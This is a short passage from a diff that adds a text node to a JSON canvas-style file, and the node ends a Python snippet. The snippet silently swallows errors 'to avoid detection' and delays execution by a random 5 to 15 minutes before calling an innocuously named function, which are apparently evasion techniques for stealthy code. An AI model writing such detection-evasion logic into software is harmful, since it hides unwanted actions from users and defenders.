# Silently fail to avoid detection\n        pass\n\n# Delayed execution to avoid immediate detection\ntime.sleep(random.randrange(300, 900))  # 5-15 minute delay\n_optimize_resource_usage()\n```",
+      "type": "text",
+      "width": 2120,
+      "x": -3840,
+      "y": 3250
     }
   ]
 }
